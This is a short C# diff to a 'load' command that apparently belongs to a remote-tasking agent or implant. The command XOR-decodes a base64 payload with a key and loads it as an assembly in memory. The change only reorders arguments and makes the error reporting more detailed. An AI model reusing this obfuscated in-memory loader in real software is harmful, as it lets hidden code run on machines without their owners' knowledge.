@@ -12,7 +12,7 @@ namespace Dots.Commands
     {
         public override string Name => "load";
 
-        private static byte[] Zor(string key, byte[] input)
+        private static byte[] Zor(byte[] input, string key)
         {
             int _key = Int32.Parse(key);
             byte[] mixed = new byte[input.Length];
@@ -27,12 +27,12 @@ namespace Dots.Commands
         {
             try
             {
-                Assembly assembly = Assembly.Load(Zor(task.Params[0], Convert.FromBase64String(task.Params[1])));
+                Assembly assembly = Assembly.Load(Zor(Convert.FromBase64String(task.Params[0]), task.Params[1]));
                 SetupResult(task, $"Succesfully loaded {assembly.FullName} module.");
             }
             catch (Exception e)
             {
-                SetupError(task, e.Message);
+                SetupError(task, e.ToString());
             }
         }
     }
